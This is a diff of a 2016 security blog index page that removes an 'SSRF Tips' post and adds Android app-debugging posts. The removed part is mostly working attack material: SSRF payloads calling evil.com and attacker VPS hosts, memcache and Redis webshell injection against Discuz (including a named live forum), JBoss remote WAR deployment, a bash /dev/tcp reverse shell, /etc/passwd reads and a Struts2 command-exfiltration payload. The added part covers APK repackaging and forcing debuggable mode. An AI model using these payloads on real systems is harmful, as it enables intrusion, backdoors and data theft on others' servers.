@@ -263,7 +263,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/19/Android-Debug-Enable-Tips/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="xl7dev">
@@ -288,8 +288,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/07/03/SSRF-Tips/" itemprop="url">
-                  SSRF Tips
+                <a class="post-title-link" href="/2016/09/19/Android-Debug-Enable-Tips/" itemprop="url">
+                  Android Debug Enable Tips
                 </a>
               
             
@@ -303,8 +303,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-03T04:10:22+08:00">
-                2016-07-03
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-19T03:39:29+08:00">
+                2016-09-19
               </time>
             
 
@@ -341,135 +341,146 @@
       
         
           
-            <h3 id="SSRF-PHP-function"><a href="#SSRF-PHP-function" class="headerlink" title="SSRF PHP function"></a>SSRF PHP function</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
-<h3 id="URL-schema-support"><a href="#URL-schema-support" class="headerlink" title="URL schema support"></a>URL schema support</h3><blockquote>
-<p>SFTP</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?url=sftp://evil.com:11111/</span><br><span class="line"></span><br><span class="line">evil.com:$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)</span><br><span class="line">SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure>
+            <h3 id="0x01-AndroidManifest-xml-debuggable"><a href="#0x01-AndroidManifest-xml-debuggable" class="headerlink" title="0x01 AndroidManifest.xml debuggable"></a>0x01 AndroidManifest.xml debuggable</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; apktool d example.apk -o example</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>Dict</p>
+<p>AndroidManifest.xml add android:debuggable=”true”</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?dict://attacker:11111/</span><br><span class="line"></span><br><span class="line">evil.com:$ nc -v -l 11111</span><br><span class="line">Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)</span><br><span class="line">CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>gopher</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;application android:allowBackup=&quot;true&quot; android:debuggable=&quot;true&quot; android:icon=&quot;@drawable/header&quot; android:label=&quot;@string/app_name&quot; android:name=&quot;com.example&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppBaseTheme&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; apktool b example -o new_example.apk</span><br><span class="line">&gt; jarsigner -keystore debug.keystore -storepass android -keypass android new_example.apk androiddebugkey</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-boot-img"><a href="#0x02-boot-img" class="headerlink" title="0x02 boot.img"></a>0x02 boot.img</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.从Google官方网站下载到boot.img</span><br><span class="line">2.使用工具（abootimg，gunzip, cpio）把boot.img完全解开，获取到default.prop</span><br><span class="line">3.修改default.prop</span><br><span class="line">4.把修改后的文件重新打包成boot_new.img</span><br><span class="line">5.使用fastboot工具把boot_new.img刷入设备（fastboot flash boot boot_new.img）</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-mprop"><a href="#0x03-mprop" class="headerlink" title="0x03 mprop"></a>0x03 mprop</h3><blockquote>
+<p><a href="https://blog.safebuff.com/upload/mprop">mprop</a></p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php</span><br><span class="line">&lt;?php</span><br><span class="line">        header(&apos;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">evil.com:# nc -v -l 12346</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12346)</span><br><span class="line">Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)</span><br><span class="line">HI</span><br><span class="line">Multiline</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>TFTP</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET</span><br><span class="line"></span><br><span class="line">evil.com:# nc -v -u -l 12346</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12346)</span><br><span class="line">TESTUDPPACKEToctettsize0blksize512timeout6</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>file</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/redirect.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>ldap</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit</span><br></pre></td></tr></table></figure>
-<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><blockquote>
-<p>PHP-FPM universal SSRF bypass safe_mode/disabled_functions/o <a href="https://gist.github.com/xl7dev/72f93dba273f4c353a69f770e8f9c4a6" target="_blank" rel="external">exploit</a></p>
-</blockquote>
-<h3 id="SSRF-memcache-Getshell"><a href="#SSRF-memcache-Getshell" class="headerlink" title="SSRF memcache Getshell"></a>SSRF memcache Getshell</h3><blockquote>
-<p>Generate serialize</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $code=array(&apos;global_start&apos;=&gt;&apos;@eval($_REQUEST[\&apos;eval\&apos;]);&apos;);</span><br><span class="line">    echo serialize($code).&quot;\n&quot;.strlen(serialize($code));</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Output</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:12:&quot;global_start&quot;;s:25:&quot;@eval($_REQUEST[&apos;eval&apos;]);&quot;;&#125; //序列化数据</span><br><span class="line">59  //字符串长度</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>webshell.php</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//gopher可以换成如上其它方式</span><br><span class="line">    header(&apos;Location: gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:&#123;s:6:&quot;output&quot;;a:1:&#123;s:4:&quot;preg&quot;;a:2:&#123;s:6:&quot;search&quot;;s:5:&quot;/.*/e&quot;;s:7:&quot;replace&quot;;s:33:&quot;eval(base64_decode($_POST[ccc]));&quot;;&#125;&#125;s:13:&quot;rewritestatus&quot;;i:1;&#125;%0d%0a&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>back.php</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Location: gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="example-Discuz"><a href="#example-Discuz" class="headerlink" title="example Discuz"></a>example Discuz</h4><blockquote>
-<p>open the website</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://bbs.biligame.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://myvps/webshell.php?logo.jpg[/img]</span><br><span class="line">http://bbs.biligame.com/forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>clear data</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bbs.biligame.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://myserver/back.php?logo.jpg[/img]</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>backdoor url</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bbs.biligame.com/data/cache/hello.php</span><br></pre></td></tr></table></figure>
-<h3 id="SSRF-Redis-Getshell"><a href="#SSRF-Redis-Getshell" class="headerlink" title="SSRF Redis Getshell"></a>SSRF Redis Getshell</h3><blockquote>
-<p>Generate serialize</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a[&apos;output&apos;][&apos;preg&apos;][&apos;search&apos;][&apos;plugins&apos;] = &apos;/.*/e&apos;;</span><br><span class="line">    $a[&apos;output&apos;][&apos;preg&apos;][&apos;replace&apos;][&apos;plugins&apos;] = &apos;@eval($_POST[&apos;c&apos;]);&apos;;</span><br><span class="line">    $a[&apos;rewritestatus&apos;]=1;</span><br><span class="line">    $setting = serialize($a);</span><br><span class="line">    echo $setting.&quot;\n&quot;.strlen($setting);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Output</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:6:&quot;output&quot;;a:1:&#123;s:4:&quot;preg&quot;;a:2:&#123;s:6:&quot;search&quot;;a:1:&#123;s:7:&quot;plugins&quot;;s:5:&quot;/.*/e&quot;;&#125;s:7:&quot;replace&quot;;a:1:&#123;s:7:&quot;plugins&quot;;s:19:&quot;@eval($_POST[&quot;c&quot;]);&quot;;&#125;&#125;&#125;s:13:&quot;rewritestatus&quot;;i:1;&#125;     //序列化数据</span><br><span class="line">173     //字符串长度</span><br></pre></td></tr></table></figure>
-<h4 id="example-Discuz-1"><a href="#example-Discuz-1" class="headerlink" title="example Discuz"></a>example Discuz</h4><blockquote>
-<p>Open website</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.116/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://you-vps-ip/ssrf.php?.jpg[/img]&amp;formhash=818c8f44</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Backdoor website</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.116/forum.php?mod=ajax&amp;inajax=yes&amp;action=getthreadtypes</span><br></pre></td></tr></table></figure>
-<h3 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h3><blockquote>
-<p>cat test.jpg</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://example.org/header.m3u8|file:///etc/passwd</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><a href="https://www.ffmpeg.org/ffmpeg-protocols.html#subfile" target="_blank" rel="external">subfile</a></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://localhost/header.m3u8|subfile,,start,0,end,64,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,64,end,128,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,128,end,256,,:///etc/passwdconcat:http://localhost/header.m3u8|subfile,,start,256,end,512,,:///etc/passwd</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
-<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><blockquote>
-<p>Exploit</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT dblink_send_query(&apos;host=127.0.0.1 dbname=quit user=\&apos;\nstats\n\​&apos; password=1 port=11211 sslmode=disable&apos;,&apos;select</span><br><span class="line">version();&apos;);</span><br></pre></td></tr></table></figure>
-<h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><blockquote>
-<p>Exploit</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.copyDatabase(&quot;\1\2\3\4\5\6\7&quot;,&apos;test&apos;,&apos;localhost:8000&apos;)</span><br><span class="line">&gt; nc -l 8000 | hexdump -C</span><br><span class="line">&gt; db.copyDatabase(“\nstats\nquit”,’test’,’localhost:11211’)</span><br></pre></td></tr></table></figure>
-<h3 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h3><blockquote>
-<p>exploit</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:5984/_users/_all_docs</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: CouchDB/1.2.0 (Erlang OTP/R15B01)</span><br><span class="line">ETag: &quot;BD1WV12007V05JTG4X6YHIHCA&quot;</span><br><span class="line">Date: Tue, 18 Dec 2012 21:39:59 GMT</span><br><span class="line">Content-Type: text/plain; charset=utf-8</span><br><span class="line">Cache-Control: must-revalidate</span><br><span class="line"></span><br><span class="line">&#123;&quot;total_rows&quot;:1,&quot;offset&quot;:0,&quot;rows&quot;:[</span><br><span class="line">&#123;&quot;id&quot;:&quot;_design/_auth&quot;,&quot;key&quot;:&quot;_design/_auth&quot;,&quot;value&quot;:&#123;&quot;rev&quot;:&quot;1-a8cfb993654bcc635f126724d39eb930&quot;&#125;&#125;</span><br><span class="line">]&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Attacker could also send requests from CouchDB server to intranet by using replication <a href="http://docs.couchdb.org/en/stable/api/server/common.html#replicate" target="_blank" rel="external">function</a></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST http://couchdb:5984/_replicate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;source&quot; : &quot;recipes&quot;,</span><br><span class="line">    &quot;target&quot; : &quot;http://ssrf-me:11211/recipes&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><blockquote>
-<p>Jbosss POC</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://our_public_internet_server/utils/cmd.war</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>写入shell</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/ueditor/jsp/getRemoteImage.jsp</span><br><span class="line">POST:</span><br><span class="line">    upfile=http://10.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp%26name=jboss.system%3Aservice%3DMainDeployer%26methodIndex=3%26arg0=http%3A%2F%2F远端地址%2Fhtml5.war%23.jpg</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/ueditor/jsp/getRemoteImage.jsp</span><br><span class="line">POST:</span><br><span class="line">    upfile=http://内网IP:8080/html5/023.jsp%23.jpg</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>reverse shell</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.45.67.89/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><blockquote>
-<p>gopher.php</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Location:gopher://vps-ip:2333/_test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>vuln website</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://example.com/uddiexplorer/SearchPublicRegistries.jsp</span><br><span class="line">POST:</span><br><span class="line">    operator=http://vps-ip/gopher.php&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>vps</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lvv 2333</span><br><span class="line"></span><br><span class="line">Connection from xx.xx.xx.xx port 2333 [tcp/snapp] accepted</span><br></pre></td></tr></table></figure>
-<h3 id="Local-File-Read"><a href="#Local-File-Read" class="headerlink" title="Local File Read"></a>Local File Read</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/redirect.php?url=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/redirect.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
-<h3 id="Bool-SSRF"><a href="#Bool-SSRF" class="headerlink" title="Bool SSRF"></a>Bool SSRF</h3><blockquote>
-<p>Struts2-016 POC</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&apos;command&apos;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://SERVER/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;</span><br><span class="line">//修改SERVER为你vps地址,返回结果在access.log中查看</span><br></pre></td></tr></table></figure>
-<h3 id="SSRF-Proxy"><a href="#SSRF-Proxy" class="headerlink" title="SSRF Proxy"></a>SSRF Proxy</h3><p><a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="external">SSRF_Proxy</a></p>
-<p><a href="https://github.com/iamultra/ssrfsocks" target="_blank" rel="external">ssrfsocks</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; ps |grep zygote|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</span><br><span class="line">&gt; mprop ro.debuggable 1</span><br><span class="line">&gt; getprop ro.debuggable</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-Xposed-hook-system-debug-Install-Xinstaller-Plugin"><a href="#0x04-Xposed-hook-system-debug-Install-Xinstaller-Plugin" class="headerlink" title="0x04 Xposed hook system debug (Install Xinstaller Plugin)"></a>0x04 Xposed hook system debug (Install Xinstaller Plugin)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 通过Xposed安装Xinstaller</span><br><span class="line">2. ☑️专家模式</span><br><span class="line">3. 其它设置&gt;&gt;调试应用</span><br><span class="line">4. 重启手机</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/08/Android-Dynamic-Debug/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/08/Android-Dynamic-Debug/" itemprop="url">
+                  Android Dynamic Debug
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-08T12:31:04+08:00">
+                2016-09-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Install-Tools"><a href="#0x01-Install-Tools" class="headerlink" title="0x01 Install Tools"></a>0x01 Install Tools</h3><p>1) smalidea<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</span><br></pre></td></tr></table></figure></p>
+<p>2) IDEA install smalidea<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Preferences &gt;&gt; Plugins &gt;&gt; Install plugin from disk</span><br></pre></td></tr></table></figure></p>
+<p>3) baksmali<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.1.3.jar -O baksmali.jar</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02-Usage"><a href="#0x02-Usage" class="headerlink" title="0x02 Usage"></a>0x02 Usage</h3><p><strong>step 1</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar baksmali.jar app.apk -o app/src</span><br></pre></td></tr></table></figure></p>
+<p><strong>step 2</strong></p>
+<p>导入到Android Studio</p>
+<p><strong>step 3</strong></p>
+<p>Run &gt;&gt; Edit configuration &gt;&gt; 选择+号 &gt;&gt; Remote  &gt;&gt; 修改Port:8700</p>
+<p><strong>step 4</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; ~/Library/Android/sdk/tools/monitor</span><br></pre></td></tr></table></figure></p>
+<p><strong>step 5</strong></p>
+<p>USB接入android手机，在monitor程序中的Devices会看到手机驱动在线，选择你要调试的android程序包名</p>
+<p><strong>step 6</strong></p>
+<p>在android studio中在想要下断点的smali代码中增加一个断点，然后按快捷键Control+D</p>
 
           
         
@@ -508,7 +519,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/30/Advanced-CSRF/">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/05/SQLMAP-Tamper/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="xl7dev">
@@ -533,8 +544,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/06/30/Advanced-CSRF/" itemprop="url">
-                  Advanced CSRF
+                <a class="post-title-link" href="/2016/09/05/SQLMAP-Tamper/" itemprop="url">
+                  SQLMAP Tamper
                 </a>
               
             
@@ -548,8 +559,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-30T18:52:37+08:00">
-                2016-06-30
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-05T15:10:42+08:00">
+                2016-09-05
               </time>
             
 
@@ -586,674 +597,676 @@
       
         
           
